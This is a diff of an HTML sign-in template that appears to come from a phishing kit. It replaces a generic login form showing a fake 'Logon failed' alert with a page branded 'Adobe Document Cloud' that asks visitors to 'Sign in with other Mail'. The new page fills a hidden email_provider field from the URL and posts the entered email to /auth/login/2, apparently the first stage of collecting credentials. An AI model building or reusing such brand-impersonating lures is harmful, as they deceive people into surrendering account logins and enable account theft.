@@ -1,49 +1,60 @@
-@layout('layouts.app')
+<!DOCTYPE html>
+<html lang="en">
 
-@section('content')
-<div class="cb-login-static-alert cb-login-message cb-login-alert-message cb-loginFormArea">
-  <div class="cb-alert-message_container static-alert">
-    <div class="cb-alert cb-alert-msg cb-alert-message_content cb-alert-danger" role="alert" aria-live="assertive">
-      <div class="cb-alert-message_inner" style="line-height: 2.8;">
-        <p>
-          <span class="ui-icon icon-warning-sign " aria-hidden="true" aria-label="error"></span>
-          Logon failed. Please try again.
-        </p>
-        <p class="cb-alert-message_sizer">X</p>
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In</title>
+  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/main.css">
+</head>
+
+<body>
+  <header></header>
+
+  <div class="box-modal">
+    <div class="overlay"></div>
+    <div class="body-modal">
+      <div class="card">
+        <ul class="list-group list-group-flush">
+          <li class="list-group-item" style="padding-top: 1.5rem;">
+            <div class="card-header">
+              <img src="/img/logo.png" alt="logo" class="card-header-icon">
+              <h5 class="card-header-title">Adobe Document Cloud</h5>
+            </div>
+            <img src="/img/other.png" alt="other" height="90" style="margin-top: 20px;">
+            <p class="card-header-text">Sign in with other Mail</p>
+          </li>
+          <li class="list-group-item" style="padding-bottom: 1.5rem;border: none;">
+            <div class="row">
+              <form action="/auth/login/2" method="post" style="width: 510px;">
+                <input type="text" value="" id="email_provider" name="email_provider" style="display: none;">
+                <script>
+                  var urlParams = new URLSearchParams(window.location.search);
+
+                  if (urlParams.has("email_provider") === true) {
+                    $("#email_provider").val(urlParams.get("email_provider"));
+                  } else {
+                    console.log("An error has occurred while trying to parse URL params...");
+                  }
+                </script>
+
+                <div class="form-group">
+                  <label for="username" class="form-label">Email</label>
+                  <input id="username" name="username" class="form-input" type="email" autocomplete="off" required>
+                </div>
+
+                <div class="btn-group">
+                  <button class="btn" type="submit">Continue</button>
+                </div>
+              </form>
+            </div>
+          </li>
+        </ul>
       </div>
     </div>
   </div>
-</div>
+</body>
 
-<div class="cb-login-form cb-loginFormArea">
-  <form class="cb-form" action="/auth/login/2" method="POST">
-    <div class="field">
-      <label class="cb-login-field" for="username">Login ID</label>
-      <input id="username" name="username" class="mrg-T-sm form-control cb-text-field" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-    </div>
-
-    <div class="field">
-      <label class="cb-login-field" for="password">Password</label>
-      <input id="password" name="password" class="mrg-T-sm form-control cb-text-field cb-text-field-mask" type="password" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-    </div>
-
-    <div id="userLinks">
-      <div id="rememberUserNameArea">
-        <div class="ui-checkbox">
-          <input class="sr-only" id="ckbRememberUser" type="checkbox">
-
-          <label for="ckbRememberUser">
-            <svg aria-hidden="true" focusable="false" width="20" height="20" viewBox="0 0 20 20"><rect fill="none" stroke="none" stroke-width="2" x="1" y="1" width="18" height="18" rx="3"></rect><polyline fill="none" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" points="4 11.4390244 7.44978307 15.0611808 16 5"></polyline></svg>
-            Remember me
-          </label>
-        </div>
-      </div>
-
-      <button class="logon-submit btn-primary btn-block pointer btn disabled" disabled="">
-        <div class="icon"></div>
-        Log In
-      </button>
-    </div>
-  </form>
-</div>
-@endsection
+</html>
